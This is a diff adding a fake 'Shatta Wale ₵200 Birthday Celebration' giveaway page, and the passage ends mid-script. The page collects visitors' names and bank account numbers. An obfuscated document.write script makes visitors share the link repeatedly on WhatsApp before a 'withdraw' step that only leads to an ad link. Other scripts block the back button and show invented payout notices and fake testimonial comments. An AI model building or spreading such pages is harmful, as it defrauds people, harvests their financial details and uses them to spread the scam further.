@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>Shatta Wale ₵200 Birthday Celebration</title>
+    <link rel="shortcut icon" type="image/jpg" href="https://vaazat.github.io/shatta-wale/let/IMG-20261016-WA0001.jpg" />
+    <meta name="og:title" content="Get ₵200 on Shatta Wale Birthday Celebration" />
+    <meta name="og:url" content="www.shatta.com" />
+    <meta name="og:description" content="₵200 on Shatta Wale Birthday Celebration" />
+    <meta name="og:image" content="https://vaazat.github.io/shatta-wale/let/IMG-20261016-WA0001.jpg" />
+    <meta name="og:type" content="website" />
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body>
+
+<style>
+* { margin: 0; padding: 0; font-family: Poppins, 'Droid Arabic Naskh', serif; font-weight: normal; box-sizing: border-box; }
+body { direction: ltr; background: #ebedf0; }
+a { text-decoration: none; }
+.post { background: #fff; margin: 0 auto; padding: 10px; max-width: 500px; border: 1px solid #d0d1d5; border-radius: 3px; }
+.post img { width: 100%; }
+.welcome { font-size: 15px; }
+.amount, #getname { color: #098105; text-decoration: none; }
+.done { text-align: center; color: #27ae60; }
+.tip { line-height: 1.2; margin: 4px 0; }
+.title { text-align: center; }
+.error { display: none; text-align: center; font-size: 14px; color: #e74c3c; }
+button { display: block; width: 260px; height: 50px; color: #fff; border: none; outline: none; font-size: 24px; cursor: pointer; border-radius: 5px; padding: 0 10px; margin: 10px auto; background: rgb(6, 32, 226); transition: background 0.3s ease; }
+button:hover { background: #098105; }
+.phone { max-width: 400px; margin: 10px auto; }
+.phone input { width: 100%; height: 50px; padding: 10px; outline: none; border: 2px solid #cecece; font-size: 14px; }
+#confirm { width: 200px; margin: 10px auto; border-radius: 0px; }
+#loader { text-align: center; }
+.spin { width: 50px; height: 50px; background: transparent; border: solid 8px rgb(9, 129, 5); border-right-color: transparent; border-radius: 50%; margin: 10px auto; animation: spin 0.8s linear infinite; }
+@keyframes spin { 100% { transform: rotate(1turn); } }
+#loader, #info, #checking, #share, #claim { display: none; }
+.center { display: flex; align-items: center; justify-content: center; }
+.barr { direction: ltr; max-width: 400px; margin: 10px auto; box-sizing: border-box; }
+.fill { position: relative; display: inline-block; width: calc(100% - 100px); height: 35px; padding: 2px; border: 2px solid #098105; }
+#fill, #fill2 { background: #098105; width: 0%; height: 100%; }
+.percentage { width: 100px; float: right; height: 35px; font-size: 16px; border: 2px solid #098105; }
+#percentage, #percentage2 { margin-left: 5px; }
+#check, #check2 { display: none; }
+.counter { color: #7f7f7f; font-size: 12px; text-align: right; padding: 10px 0 10px 2px; border-bottom: 1px solid #e1e2e3; }
+.notification { display: none; color: rgb(42, 50, 165); font-weight: bold; font-size: 15px; padding: 7px 15px; position: fixed; top: 10px; left: 0; width: fit-content; text-align: center; white-space: nowrap; background: rgba(180, 161, 232, 0.8); border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); animation: moveRight 3s linear infinite alternate; z-index: 1000; }
+@keyframes moveRight { 0% { transform: translateX(0); } 100% { transform: translateX(100px); } }
+#flc-widget { width: 100%; max-width: 520px; margin: 0 auto; background: #FFFFFF; border-radius: 16px; box-shadow: 0 1px 2px rgba(0,0,0,.08), 0 8px 24px rgba(0,0,0,.06); overflow: hidden; display: flex; flex-direction: column; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #050505; box-sizing: border-box; }
+#flcComments { height: min(55vh, 440px); max-height: 440px; overflow-y: auto; padding: 10px 14px; box-sizing: border-box; -webkit-overflow-scrolling: touch; }
+.flc-comment-image img { width: 100%; height: auto; object-fit: cover; display: block; max-height: 220px; }
+</style>
+
+<div id="notification" class="notification"></div>
+
+<div class="post" width="100%">
+    <div id="intro">
+        <p class="welcome">
+            <center>
+                <center><img src="https://vaazat.github.io/shatta-wale/let/IMG-20261016-WA0001.jpg" alt="peller" style="width:100%; height:150;"></center>
+                <h6></h6>
+                <p>Shatta Wale is celebrating his 42 Birthday with the sum of ₵200.</p>
+                <p><b>POWERED BY:</b> Shatta Wale</p>
+                <p>Tap the button below, complete the 30-second registration, confirm your details, and get your ₵200 credited instantly.</p>
+            </center>
+        </p>
+        <button id="go">Accept ₵200</button>
+    </div>
+    <div id="loader">
+        <div class="dog-loader">
+            <span class="dog-gear">⚙️</span>
+            <span class="dog-message" id="dog-msg1">Please wait......</span>
+            <span class="dog-message" id="dog-msg2" style="display:none">Processing your request, please wait...</span>
+            <span class="dog-message" id="dog-msg3" style="display:none">Checking the server, almost there......</span>
+        </div>
+    </div>
+    <div id="info">
+        <div class="phone">
+            <form>
+                <div style="margin-bottom: 10px; display: flex; align-items: center;">
+                    <label for="name" style="font-weight: bold; width: 80px; margin-right: 8px;">name:</label>
+                    <input type="text" id="name" name="name" placeholder="Enter your name" required style="flex: 1; padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+                </div>
+                <div style="margin-bottom: 10px; display: flex; align-items: center;">
+                    <label for="number" style="font-weight: bold; width: 80px; margin-right: 8px;">Account number:</label>
+                    <input type="number" id="number" name="number" placeholder="Enter your Account number" required style="flex: 1; padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px;">
+                </div>
+            </form>
+            <button id="confirm">SUBMIT</button>
+        </div>
+        <p class="error">Please enter a valid info</p>
+    </div>
+    <div id="checking">
+        <center>
+            <div>Please wait...</div>
+            <div class="dog-loader">
+                <div class="dog-loader-2">
+                    <span class="dog-gear-2">⚙️</span>
+                    <span class="dog-message-2" id="dog-msg2-1" style="display:inline">Checking your name....</span>
+                    <span class="dog-message-2" id="dog-msg2-2" style="display:none">Checking the server...</span>
+                    <span class="dog-message-2" id="dog-msg2-3" style="display:none">Almost there...</span>
+                </div>
+            </div>
+        </center>
+    </div>
+    <div id="share">
+        <p class="tip">Congratulation! Your Application Number is <span id="output"></span></p>
+        <p class="tip">NAME: <span id="getname"></span>, Account number <span id="getname2"></span></p>
+        <p class="tip">
+            Your ₵200 is still <font color="red"><b>pending</b></font> because you have not completed the Human verification process
+            <br/><span class="amount">Please complete the verification process to withdraw your money Now</span><br>
+        </p>
+        <h5 style="color: red;">How to proceed: to the withdrawal form</h5>
+        <p class="tip">1. Share it to 5 groups or with 15 friends on WhatsApp (Click the "SHARE" button below).</p>
+        <p class="tip">2. Your registration will automatically complete once the GREEN verification bar is filled.</p>
+        <p class="tip">3. Click "Withdraw Cash now" to claim your ₵200.</p>
+        <h5 style="color: red;">👇👇. .👇👇</h5>
+        <button id="whatsapp">SHARE</button>
+        <div class="barr">
+            <div class="fill"><div id="fill2"></div></div>
+            <div class="percentage center">
+                <span><i class="fa fa-spinner fa-pulse"></i></span>
+                <span id="percentage2">0%</span>
+            </div>
+        </div>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+        <div onclick="tipn()" style="margin: 20px auto 0; background-color: #0205a2; color: #ffffff; padding: 14px 30px; width: fit-content; border-radius: 6px; text-align: center; font-weight: bold; cursor: pointer; display: block;">
+            Withdraw Cash now
+        </div>
+        <script>
+        function tipn() {
+            Swal.fire({
+                icon: 'error',
+                title: 'Unfortunately...',
+                text: 'To Receive Your ₵200, You have to share with friends about our offer. Share until the blue bar is full!'
+            });
+        }
+        </script>
+    </div>
+    <div id="claim">
+        <p class="done"><i class="fa fa-check-circle fa-3x" aria-hidden="true" style="color:#27ae60"></i></p>
+        <p class="title">Your registration has been completed.</p>
+        <button id="offer">CONTINUE</button>
+        <div style="padding: 1.5rem 1rem; display: flex; flex-direction: column; gap: 14px; align-items: center;">
+            <a href="https://rm358.com/4/11952240" onclick="window.open('https://rm358.com/4/11952240')" style="text-decoration: none; width: 100%; max-width: 420px;">
+                <div style="display: flex; align-items: center; justify-content: center; gap: 10px; width: 100%; padding: 16px 24px; background: #1D9E75; color: #E1F5EE; border-radius: 12px; font-size: 17px; font-weight: 500; cursor: pointer; box-sizing: border-box;">
+                    CASH OUT ₵200 NOW
+                </div>
+            </a>
+        </div>
+        <br/><br/><br/>
+    </div>
+</div>
+
+<p id="offer-date"></p>
+
+<script src="https://code.jquery.com/jquery-latest.min.js"></script>
+
+<script>
+function updateOfferDate() {
+    const tomorrow = new Date();
+    tomorrow.setDate(tomorrow.getDate() + 2);
+    const day = tomorrow.getDate();
+    const month = tomorrow.toLocaleString('en-GB', { month: 'long' });
+    let suffix = 'th';
+    if (day % 100 < 11 || day % 100 > 13) {
+        if (day % 10 === 1) suffix = 'st';
+        else if (day % 10 === 2) suffix = 'nd';
+        else if (day % 10 === 3) suffix = 'rd';
+    }
+    document.getElementById('offer-date').textContent = `Ending ${day}${suffix} ${month}`;
+}
+updateOfferDate();
+</script>
+
+<script type="text/javascript">
+var time = 0;
+window.setInterval(function () {
+    time = time + 1;
+    $(".t1").html(time + 1 + "m");
+    $(".t2").html(time + 2 + "m");
+    $(".t3").html(time + 4 + "m");
+}, 6e4);
+var likes = 134, comments = 23, shares = 12;
+window.setInterval(function () {
+    likes = likes + Math.floor(Math.random() * 3);
+    comments = comments + Math.floor(Math.random() * 2);
+    shares = shares + Math.floor(Math.random() * 2);
+    $("#likes").html(likes + "K");
+    $("#comments").html(comments + "K comments");
+    $("#shares").html(shares + "K shares");
+}, 5e3);
+$(".liked").click(function () {
+    if ($(this).hasClass("selected")) {
+        $(this).removeClass("selected");
+        $(this).html("Like");
+    } else {
+        $(this).addClass("selected");
+        $(this).html("Unlike");
+    }
+});
+</script>
+
+<script type="text/javascript">
+var text1 = "*Shatta%20Wale%20₵200%20Birthday%20Giveaway*%0A%0AShatta%20Wale%20is%20Giving%20out%20₵200%20to%20every%20Ghanians%20as%20he%20joyfully%20celebrates%20his%20Birthday.%20I%20just%20got%20mine%0A%0AClaim%20Yours%20Now%20Here👇%0Ahttps://gh.kanex.online/shatta-birthday.html?₵200%0A%0Ahttps://gh.kanex.online/shatta-birthday.html?₵250%0A%0A*ENDING%20SOON*";
+var text2 = " an amount of ";
+var text3 = " for every citizen who meets the conditions as an aid to the poor class to overcome the crisis. Enter and register now and make sure to register correctly 👉 ";
+var error = "Something is wrong!\nPosts are not calculated. You may have shared it with the same friend or group more than once, please re-share";
+var abcde = "https://rm358.com/4/11952240";
+var saved = "";
+var share = "whatsapp://send?text=" + text1;
+</script>
+
+<script>
+document.write(unescape('%20%3Cscript%20type%3D%22text/javascript%22%3E%0A%20var%20swidth%20%3D%20localStorage.getItem%28saved%29%3B%0Aif%20%28swidth%20%21%3D%3D%20null%29%20%7B%0A%20%20%20%20var%20width%20%3D%20swidth%20*%201%3B%0A%20%20%20%20%24%28%22%23intro%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22.comments%22%29.fadeOut%280%29%3B%0A%20%20%20%20%24%28%22%23share%22%29.fadeIn%280%29%3B%0A%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%7D%20else%20%7B%0A%20%20%20%20var%20width%20%3D%200%3B%0A%7D%0A%24%28%22%23whatsapp%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.location.href%20%3D%20share%3B%0A%20%20%20%20if%20%28width%20%3D%3D%200%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%2050%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2050%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2015%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2065%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2070%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%2010%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2080%29%20%7B%0A%20%20%20%20%20%20%20%20alert%28error%29%3B%0A%20%20%20%20%20%20%20%20width%20+%3D%205%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2085%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2087%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2088%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2090%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2091%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2092%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2093%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2094%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2095%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%201%3B%0A%20%20%20%20%7D%20else%20if%20%28width%20%3D%3D%2096%29%20%7B%0A%20%20%20%20%20%20%20%20width%20+%3D%202%3B%0A%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23share%22%29.fadeOut%280%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23claim%22%29.fadeIn%281000%29%3B%0A%20%20%20%20%7D%0A%20%20%20%20localStorage.setItem%28saved%2C%20width%29%3B%0A%20%20%20%20setTimeout%28function%20%28%29%20%7B%0A%20%20%20%20%20%20%20%20%24%28%22%23fill2%22%29.css%28%22width%22%2C%20width%20+%20%22%25%22%29%3B%0A%20%20%20%20%20%20%20%20%24%28%22%23percentage2%22%29.text%28width%20+%20%22%25%22%29%3B%0A%20%20%20%20%7D%2C%202000%29%3B%0A%7D%29%3B%0A%24%28%22%23offer%22%29.click%28function%20%28%29%20%7B%0A%20%20%20%20window.open%28abcde%2C%20%22_blank%22%29%3B%0A%7D%29%3B%0A%3C/script%3E'))
+</script>
+
+<script>
+(function (global) {
+    if (typeof (global) === "undefined") {
+        throw new Error("window is undefined");
+    }
+    var _hash = "!";
+    var noBackPlease = function () {
+        global.location.href += "#";
+        global.setTimeout(function () { global.location.href += "!"; }, 50);
+    };
+    global.onhashchange = function () {
+        if (global.location.hash !== _hash) { global.location.hash = _hash; }
+    };
+    global.onload = function () {
+        noBackPlease();
+        document.body.onkeydown = function (e) {
+            var elm = e.target.nodeName.toLowerCase();
+            if (e.which === 8 && (elm !== 'input' && elm !== 'textarea')) { e.preventDefault(); }
+            e.stopPropagation();
+        };
+    };
+})(window);
+</script>
+
+<script>
+function generateRandom() {
+    const numbers = '0123456789';
+    const letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
+    let randomString = '';
+    for (let i = 0; i < 3; i++) {
+        randomString += numbers.charAt(Math.floor(Math.random() * numbers.length));
+    }
+    for (let i = 0; i < 2; i++) {
+        randomString += letters.charAt(Math.floor(Math.random() * letters.length));
+    }
+    document.addEventListener("DOMContentLoaded", function() {
+        document.getElementById('output').textContent = randomString;
+    });
+}
+generateRandom();
+</script>
+
+<script>
+! function () {
+    var t;
+    try {
+        for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
+        onpopstate = function (t) {
+            t.state && alert('Please Share Maximum to receive gift. ');
+        };
+    } catch (o) { }
+}();
+</script>
+
+<script>
+const messages = [
+    "₵200 sent to Kwame Mensah 4827163059 GCB Bank",
+    "₵200 sent to Akosua Asante 7152048631 Ecobank Ghana",
+    "₵200 sent to Kofi Boateng 9361825074 Absa Bank Ghana",
+    "₵200 sent to Ama Owusu 2648197350 Fidelity Bank Ghana",
+    "₵200 sent to Yaw Osei 8516372049 Stanbic Bank Ghana",
+    "₵200 sent to Abena Appiah 6039251748 CalBank",
+    "₵200 sent to Kojo Adjei 1974386250 Zenith Bank Ghana",
+    "₵200 sent to Akua Agyeman 5247609183 Access Bank Ghana",
+    "₵200 sent to Kwaku Antwi 7482916305 Republic Bank Ghana",
+    "₵200 sent to Efua Darko 3158647290 UBA Ghana",
+    "₵200 sent to Kwabena Frimpong 6825074193 GCB Bank",
+    "₵200 sent to Adwoa Gyasi 4591738260 Ecobank Ghana",
+    "₵200 sent to Nana Yeboah 8274603159 Absa Bank Ghana",
+    "₵200 sent to Esi Amankwah 1369258047 Fidelity Bank Ghana",
+    "₵200 sent to Kwesi Addo 5943186720 Stanbic Bank Ghana",
+    "₵200 sent to Afia Acheampong 7610394852 CalBank",
+    "₵200 sent to Kofi Asare 2486751930 Zenith Bank Ghana",
+    "₵200 sent to Adjoa Poku 9031576428 Access Bank Ghana",
+    "₵200 sent to Nana Boateng 6718249503 Republic Bank Ghana",
+    "₵200 sent to Abena Nyarko 3859027164 UBA Ghana"
+];
+
+function toggleNotification() {
+    let notification = document.getElementById("notification");
+    let randomMessage = messages[Math.floor(Math.random() * messages.length)];
+    notification.innerText = randomMessage;
+    notification.style.display = "block";
+    setTimeout(() => { notification.style.display = "none"; }, 3000);
+}
+setInterval(toggleNotification, 6000);
+</script>
+
+<script>
+const dogMessages = [
+    document.getElementById("dog-msg1"),
+    document.getElementById("dog-msg2"),
+    document.getElementById("dog-msg3")
+];
+let dogIndex = 0;
+function showNextDogMessage() {
+    dogMessages.forEach((msg, i) => {
+        msg.style.display = i === dogIndex ? "inline" : "none";
+    });
+    dogIndex = (dogIndex + 1) % dogMessages.length;
+}
+showNextDogMessage();
+setInterval(showNextDogMessage, 2500);
+</script>
+
+<script>
+const dogMessages2 = [
+    document.getElementById("dog-msg2-1"),
+    document.getElementById("dog-msg2-2"),
+    document.getElementById("dog-msg2-3")
+];
+let dogIndex2 = 0;
+function showNextDogMessage2() {
+    dogMessages2.forEach((msg, i) => {
+        msg.style.display = i === dogIndex2 ? "inline" : "none";
+    });
+    dogIndex2 = (dogIndex2 + 1) % dogMessages2.length;
+}
+showNextDogMessage2();
+setInterval(showNextDogMessage2, 2500);
+</script>
+
+<style>
+@keyframes flcPulse {
+    0% { box-shadow: 0 0 0 0 rgba(250,56,62,.55); }
+    70% { box-shadow: 0 0 0 7px rgba(250,56,62,0); }
+    100% { box-shadow: 0 0 0 0 rgba(250,56,62,0); }
+}
+@keyframes flcPop {
+    0% { opacity: 0; transform: translateY(6px) scale(.94); }
+    100% { opacity: 1; transform: translateY(0) scale(1); }
+}
+@keyframes flcBounce {
+    0%, 60%, 100% { transform: translateY(0); opacity: .5; }
+    30% { transform: translateY(-4px); opacity: 1; }
+}
+@keyframes flcHeartUp {
+    0% { opacity: 1; transform: translateY(0) scale(.6); }
+    100% { opacity: 0; transform: translateY(-26px) scale(1.3); }
+}
+#flc-widget input { -webkit-tap-highlight-color: transparent; }
+#flc-widget button { -webkit-tap-highlight-color: transparent; }
+</style>
+
+<div id="flc-widget">
+    <div style="display:flex;justify-content:space-between;align-items:center;padding:10px 16px 8px;font-size:13.5px;color:#65676B;box-sizing:border-box;">
+        <div style="display:flex;align-items:center;gap:6px;">
+            <span style="display:inline-flex;align-items:center;">
+                <span style="width:18px;height:18px;border-radius:50%;background:#1B74E4;display:flex;align-items:center;justify-content:center;border:2px solid #fff;z-index:2;">
+                    <svg viewBox="0 0 24 24" width="11" height="11" style="fill:#fff;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
+                </span>
+                <span style="width:18px;height:18px;border-radius:50%;background:#F33E58;display:flex;align-items:center;justify-content:center;border:2px solid #fff;margin-left:-6px;z-index:1;">
+                    <svg viewBox="0 0 24 24" width="10" height="10" style="fill:#fff;"><path d="M12 21s-6.7-4.35-9.33-8.4C.86 9.94 1.6 6.6 4.36 5.1 6.6 3.9 9.3 4.6 12 7.6c2.7-3 5.4-3.7 7.64-2.5 2.76 1.5 3.5 4.84 1.69 7.5C18.7 16.65 12 21 12 21z"/></svg>
+                </span>
+            </span>
+            <span id="flcLikeTotal" style="color:#65676B;">341</span>
+        </div>
+        <div style="display:flex;gap:12px;">
+            <span><b id="flcCommentCount" style="color:#65676B;font-weight:400;">0</b> comments</span>
+            <span id="flcShareCount">18 shares</span>
+        </div>
+    </div>
+
+    <div style="display:flex;border-top:1px solid #E4E6EB;border-bottom:1px solid #E4E6EB;box-sizing:border-box;">
+        <button type="button" id="flcPostLikeBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
+            <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M2 21h4V9H2v12zM22 10c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L12.17 1 6.59 6.59C6.22 6.95 6 7.45 6 8v11c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z"/></svg>
+            Like
+        </button>
+        <button type="button" id="flcPostCommentBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
+            <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M20 2H4a2 2 0 00-2 2v18l4-4h14a2 2 0 002-2V4a2 2 0 002-2z"/></svg>
+            Comment
+        </button>
+        <button type="button" id="flcPostShareBtn" style="flex:1;display:flex;align-items:center;justify-content:center;gap:6px;padding:9px 0;background:none;border:none;cursor:pointer;font-family:inherit;font-weight:600;font-size:13.5px;color:#65676B;">
+            <svg viewBox="0 0 24 24" width="18" height="18" style="fill:currentColor;"><path d="M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z"/></svg>
+            Share
+        </button>
+    </div>
+
+    <div id="flcTypingStatus" style="min-height:18px;padding:4px 16px 0;font-size:12.5px;color:#65676B;box-sizing:border-box;"></div>
+
+    <div id="flcComments" style="padding:10px 14px;overflow-y:auto;max-height:min(60vh,440px);scroll-behavior:smooth;box-sizing:border-box;-webkit-overflow-scrolling:touch;"></div>
+
+    <div style="padding:10px 14px 12px;border-top:1px solid #E4E6EB;background:#fff;box-sizing:border-box;">
+        <div style="display:flex;gap:8px;align-items:center;">
+            <div id="flcYouAvatar" title="Click to set your profile picture" style="position:relative;width:32px;height:32px;border-radius:50%;flex-shrink:0;overflow:hidden;background:#fff;cursor:pointer;"></div>
+            <input type="file" id="flcProfilePicInput" accept="image/*" style="display:none;" />
+            <form id="flcComposerForm" style="flex:1;display:flex;gap:8px;align-items:center;min-width:0;">
+                <input id="flcComposerInput" type="text" placeholder="Write a comment…" autocomplete="off" maxlength="200" style="flex:1;min-width:0;border:none;background:#F0F2F5;border-radius:20px;padding:9px 14px;font-size:16px;font-family:inherit;outline:none;color:#050505;box-sizing:border-box;" />
+                <button type="button" id="flcAttachBtn" aria-label="Add photo" title="Add photo" style="border:none;background:#F0F2F5;color:#65676B;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
+                    <svg viewBox="0 0 24 24" width="16" height="16" style="fill:currentColor;"><path d="M9 3l-1.8 2H4a2 2 0 00-2 2v11a2 2 0 002 2h16a2 2 0 002-2V7a2 2 0 00-2-2h-3.2L15 3H9zm3 15a5 5 0 110-10 5 5 0 010 10zm0-2a3 3 0 100-6 3 3 0 000 6z"/></svg>
+                </button>
+                <input type="file" id="flcFileInput" accept="image/*" style="display:none;" />
+                <button type="submit" aria-label="Send" style="border:none;background:#1B74E4;color:#fff;width:38px;height:38px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;">
+                    <svg viewBox="0 0 24 24" width="16" height="16" style="fill:#fff;transform:translateX(1px);"><path d="M2 21l21-9L2 3v7l15 2-15 2z"/></svg>
+                </button>
+            </form>
+        </div>
+        <div id="flcAttachPreview" style="display:none;margin:8px 0 0 42px;position:relative;width:88px;">
+            <img id="flcAttachImg" src="" alt="Attached image preview" style="width:88px;height:88px;object-fit:cover;border-radius:10px;border:1px solid #E4E6EB;display:block;" />
+            <div id="flcAttachRemove" style="position:absolute;top:-6px;right:-6px;width:22px;height:22px;border-radius:50%;background:rgba(5,5,5,.8);color:#fff;border:2px solid #fff;display:flex;align-items:center;justify-content:center;font-size:12px;line-height:1;cursor:pointer;">✕</div>
+        </div>
+    </div>
+</div>
+
+<script>
+(function () {
+    const AVATAR_IMAGES = [
+        "images/1.png", "images/2.png", "images/3.png", "images/4.png", "images/5.png",
+        "images/6.png", "images/7.png", "images/8.png", "images/9.png", "images/10.png",
+        "images/11.png", "images/12.png", "images/13.png", "images/14.png", "images/15.png"
+    ];
+
+    const NAMES = ["Kwame Mensah", "Akosua Asante", "Kofi Boateng", "Ama Owusu",
+        "Yaw Osei", "Abena Appiah", "Kojo Adjei", "Akua Agyeman",
+        "Kwaku Antwi", "Efua Darko", "Kwabena Frimpong", "Adwoa Gyasi",
+        "Nana Yeboah", "Esi Amankwah", "Kwesi Addo", "Afia Acheampong"];
+
+    const COLORS = ["#F87171", "#FBBF24", "#34D399", "#60A5FA", "#A78BFA", "#F472B6",
+        "#38BDF8", "#FB923C", "#4ADE80", "#C084FC", "#F97316", "#2DD4BF"];
+
+    const TOP_COMMENTS = [
+        "Just claimed my ₵200! Shatta Wale birthday 🔥",
+        "Is this still working? I need that ₵200 birthday bonus asap",
+        "Shatta Wale, this is how we celebrate your birthday.👏",
+        "Just registered, when will the ₵200 drop into my account?",
+        "This is the best baby shower offer I've seen this year!",
+        "Who else just got credited? Let me know 👀",
+        "Shatta no dey carry last! Claiming mine now",
+        "Is the offer still open for people outside Lagos?",
+        "Just finished the registration, fingers crossed 🤞",
+        "₵200 for celebrating Shatta birthday? Count me in!",
+        "This is pure love for the people. Thank you Shatta",
+        "How long does it take for the money to reflect?",
+        "I shared with my family, we all claiming today 😂",
+        "Limited slots ke? I'm not missing this one",
+        "Best decision I made today was clicking that link",
+        "Shatta Wale to the world! Enjoyment all the way 🙌",
+        "Can confirm it works, just received mine!",
+        "Anyone from Accra or Kumasi claiming too?",
+        "This is how celebrities should celebrate with the people",
+        "Just did it in less than 1 minute. Super easy!"
+    ];
+
+    const REPLIES = [
+        "Same here, just got mine credited 🔥",
+        "Yes it's still working, hurry before it closes!",
+        "It reflected in less than 10 minutes for me",
+        "I can confirm, just received the ₦15k",
+        "Do it now, slots are finishing fast",
+        "I'm from Lagos and it worked perfectly",
+        "Just tagged my people, everybody should claim",
+        "True talk, Shatta Wale too dey try for us",
+        "I was doubting at first but it came through",
+        "Already shared in my WhatsApp group",
+        "Yes o, even people outside Accra are collecting",
+        "Just finished mine too, waiting for alert",
+        "This is the kind of baby shower celebration we like!",
+        "Don't sleep on this one, claim immediately",
+        "I got mine + my wife's. Double win 😂"
+    ];
+
+    const COMMENT_IMAGE_SLOTS = [
+        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTam_YLpFGugF-OziHkzeYDXab2o_ADAOiy2wi197TPqlTlDwJYMSsPUAc&s=10",
+        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTam_YLpFGugF-OziHkzeYDXab2o_ADAOiy2wi197TPqlTlDwJYMSsPUAc&s=10",
+        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_VDn2bPnpM7B0ta9OvEiG4xzvnkQxW7tCoXww0tTbHUYZRAgnUu_LEGyo&s=10",
+        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_VDn2bPnpM7B0ta9OvEiG4xzvnkQxW7tCoXww0tTbHUYZRAgnUu_LEGyo&s=10",
+        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT_VDn2bPnpM7B0ta9OvEiG4xzvnkQxW7tCoXww0tTbHUYZRAgnUu_LEGyo&s=10",
+        "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTam_YLpFGugF-OziHkzeYDXab2o_ADAOiy2wi197TPqlTlDwJYMSsPUAc&s=10"
+    ];
+
+    const commentsEl = document.getElementById('flcComments');
+    const commentCountEl = document.getElementById('flcCommentCount');
+    const typingStatusEl = document.getElementById('flcTypingStatus');
+
+    let commentCount = 0;
+    let commentStore = [];
+    let idSeq = 1;
+
+    function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+    function initials(name) { return name.split(' ').map(w => w[0]).slice(0, 2).join('').toUpperCase(); }
+    function colorFor(name) {
+        let h = 0;
+        for (let i = 0; i < name.length; i++) h = name.charCodeAt(i) + ((h << 5) - h);
+        return COLORS[Math.abs(h) % COLORS.length];
+    }
+    function avatarIndexFor(name) {
+        let h = 0;
